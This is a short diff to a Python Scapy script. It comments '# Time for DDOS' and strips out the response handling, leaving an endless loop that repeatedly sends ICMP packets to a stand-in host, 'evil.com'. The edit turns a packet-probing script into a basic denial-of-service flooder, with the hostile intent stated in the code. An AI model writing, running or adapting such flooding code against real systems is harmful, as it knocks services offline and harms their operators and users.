@@ -8,8 +8,7 @@ received_packets = []
 
 # Loop to send different types of packets
 while True:
-
-        # Send ICMP Echo Request
+        # Time for DDOS
     packet = IP(dst="evil.com")/ICMP()
     send(packet)
     send(packet)
@@ -31,12 +30,3 @@ while True:
     send(packet)
     send(packet)
     # Send the packet
-    response = sr1(packet, timeout=2)  # Wait 2 seconds for a response
-
-    # Store the received packet in the list
-    if response:
-        received_packets.append(response)
-
-# Display the received packets
-for pkt in received_packets:
-    pkt.show()
